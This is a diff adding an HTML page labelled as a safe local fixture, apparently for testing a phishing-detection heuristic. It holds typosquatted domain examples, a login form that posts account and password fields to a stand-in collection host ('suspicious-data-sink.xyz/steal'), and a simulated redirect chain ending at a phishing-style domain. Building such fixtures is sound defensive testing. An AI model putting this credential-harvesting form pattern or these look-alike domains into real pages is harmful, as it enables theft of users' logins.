@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>AUVYQ Threat Test Page — Safe Local Fixture</title>
+  <style>
+    body { font-family: system-ui, sans-serif; padding: 24px; max-width: 600px; margin: 0 auto; color: #1e293b; }
+    .threat-card { border: 2px solid #ef4444; background: #fef2f2; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
+    h1 { color: #dc2626; font-size: 20px; }
+    button { padding: 8px 16px; border-radius: 6px; cursor: pointer; }
+    .btn-danger { background: #ef4444; color: #fff; border: none; }
+  </style>
+</head>
+<body>
+  <div class="threat-card">
+    <h1>Harmless Threat Simulation Fixture</h1>
+    <p>Simulates a suspicious page environment for heuristic testing (e.g. typosquatted domain simulation: <code>paypa1.com</code> or <code>goog1e.com</code>).</p>
+  </div>
+
+  <div class="threat-card">
+    <h2>Foreign Origin Form</h2>
+    <p>This form action points to an unverified third-party collection endpoint:</p>
+    <form action="https://suspicious-data-sink.xyz/steal" method="POST">
+      <div>
+        <label>Account: <input type="text" name="acc" value="test@domain.com"></label>
+      </div>
+      <div style="margin-top: 10px;">
+        <label>Password: <input type="password" name="pass" value="supersecret"></label>
+      </div>
+      <div style="margin-top: 10px;">
+        <button type="submit" class="btn-danger">Submit Credentials</button>
+      </div>
+    </form>
+  </div>
+
+  <div class="threat-card" style="border-color: #f59e0b; background: #fffbeb;">
+    <h2>Redirect Chain Simulation</h2>
+    <p>Demonstrates landing on high-risk TLD after multi-hop redirects:</p>
+    <ol>
+      <li><code>https://initial-shortener.example/link</code></li>
+      <li><code>https://tracker-hop1.test/redirect?to=...</code></li>
+      <li><code>https://tracker-hop2.test/next?url=...</code></li>
+      <li><code>https://destination-phish.xyz/landing</code></li>
+    </ol>
+  </div>
+</body>
+</html>
